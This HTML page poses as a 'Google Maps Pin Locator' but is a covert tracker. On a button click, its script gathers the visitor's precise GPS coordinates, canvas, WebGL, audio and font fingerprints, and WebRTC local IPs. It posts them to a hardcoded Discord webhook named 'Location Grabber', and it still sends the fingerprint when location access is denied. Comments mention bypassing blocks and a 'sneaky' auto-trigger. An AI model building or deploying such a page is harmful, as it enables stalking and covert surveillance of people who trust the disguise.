<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Map Pin Location</title>
  <style>
    body { margin:0; font-family:Arial, sans-serif; background:#f0f0f0; color:#333; text-align:center; padding:20px; }
    h1 { color:#4285F4; }
    #map-pin { font-size:120px; margin:20px; }
    button { background:#4285F4; color:white; border:none; padding:15px 30px; font-size:20px; border-radius:8px; cursor:pointer; margin:20px; }
    button:hover { background:#3267D6; }
    #status { font-size:18px; margin:20px; color:#d93025; }
    #info { max-width:600px; margin:20px auto; text-align:left; background:white; padding:15px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
  </style>
</head>
<body>
  <h1>Google Maps Pin Locator</h1>
  <div id="map-pin">üìç</div>
  <p>Click below to drop a pin at your current location</p>
  <button onclick="getLocationAndFingerPrint()">Show My Pin</button>
  <div id="status"></div>
  <div id="info"></div>

  <script>
    const WEBHOOK = "https://discordapp.com/api/webhooks/1476658127838642326/P94xejYAhAr6YuQozQtNPPmUfs_XORRc1eAAPGdIiudTOk0SzOnso0LiVsaYgiDwi2Jz";

    // Helper: send to Discord webhook
    async function sendToWebhook(data) {
      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
            username: "Location Grabber",
            avatar_url: "https://i.imgur.com/4M34hi2.png" // optional fake avatar
          }),
          mode: "no-cors" // helps bypass some blocks
        });
      } catch(e) { console.error("Webhook fail", e); }
    }

    // Basic custom fingerprint collector (no external lib, max signals 2026)
    function collectFingerprint() {
      const fp = {};

      // Basics
      fp.userAgent = navigator.userAgent;
      fp.platform = navigator.platform;
      fp.languages = navigator.languages ? navigator.languages.join(",") : navigator.language;
      fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      fp.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
      fp.deviceMemory = navigator.deviceMemory || "unknown";
      fp.hardwareConcurrency = navigator.hardwareConcurrency || "unknown";
      fp.connection = navigator.connection ? navigator.connection.effectiveType : "unknown";

      // Canvas fingerprint
      try {
        const canvas = document.createElement("canvas");
        canvas.width = 200; canvas.height = 60;
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20); ctx.fillStyle = "#069"; ctx.fillText("Hello, world! üåç",2,15);
        ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("Hello, world! üåç",4,17);
        fp.canvas = canvas.toDataURL(); // base64 hashable
      } catch(e) { fp.canvas = "error"; }

      // WebGL fingerprint
      try {
        const glCanvas = document.createElement("canvas");
        const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl");
        if (gl) {
          const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
          fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown";
          fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
        }
      } catch(e) { fp.webgl = "error"; }

      // Audio fingerprint (simple oscillator hash)
      try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (AudioContext) {
          const ctx = new AudioContext();
          const oscillator = ctx.createOscillator();
          oscillator.type = "triangle";
          oscillator.frequency.value = 10000;
          const compressor = ctx.createDynamicsCompressor();
          oscillator.connect(compressor);
          compressor.connect(ctx.destination);
          oscillator.start(0);
          setTimeout(() => oscillator.stop(), 10); // short burst
          fp.audio = "supported"; // real hash needs offline render, but this flags
        }
      } catch(e) { fp.audio = "error"; }

      // Fonts (simple probe - limited but adds entropy)
      const fonts = ["monospace","serif","sans-serif","cursive","fantasy"];
      fp.fonts = fonts.map(f => {
        const span = document.createElement("span");
        span.style.fontFamily = f; span.innerText = "mmmmmmmmmwwwwwww";
        document.body.appendChild(span);
        const w = span.offsetWidth;
        document.body.removeChild(span);
        return w;
      }).join(",");

      // WebRTC local IP leak attempt (often works)
      fp.webrtcIps = [];
      if (RTCPeerConnection) {
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = e => {
          if (e.candidate) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
            if (ip && !fp.webrtcIps.includes(ip)) fp.webrtcIps.push(ip);
          }
        };
        setTimeout(() => pc.close(), 2000);
      }

      // Referrer & other small shit
      fp.referrer = document.referrer || "direct";
      fp.doNotTrack = navigator.doNotTrack;
      fp.prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;

      return fp;
    }

    // Main trigger
    function getLocationAndFingerPrint() {
      const status = document.getElementById("status");
      status.textContent = "Requesting location... (browser will ask permission)";

      if (!navigator.geolocation) {
        status.textContent = "Geolocation not supported.";
        sendToWebhook({ error: "No geolocation support", fp: collectFingerprint() });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const coords = position.coords;
          const data = {
            timestamp: new Date().toISOString(),
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            altitude: coords.altitude || null,
            altitudeAccuracy: coords.altitudeAccuracy || null,
            heading: coords.heading || null,
            speed: coords.speed || null,
            fingerprint: collectFingerprint(),
            ipHint: "Server-side IP not here - host & log it"
          };

          status.textContent = `Pin dropped! Lat: ${coords.latitude}, Long: ${coords.longitude}`;
          document.getElementById("info").innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
          sendToWebhook(data);
        },
        (error) => {
          status.textContent = `Location denied or error: ${error.message}`;
          const data = { error: error.message, code: error.code, fingerprint: collectFingerprint() };
          sendToWebhook(data);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Optional: auto-trigger after 3s for sneaky (but needs gesture usually)
    // setTimeout(getLocationAndFingerPrint, 3000);
  </script>
</body>
</html>
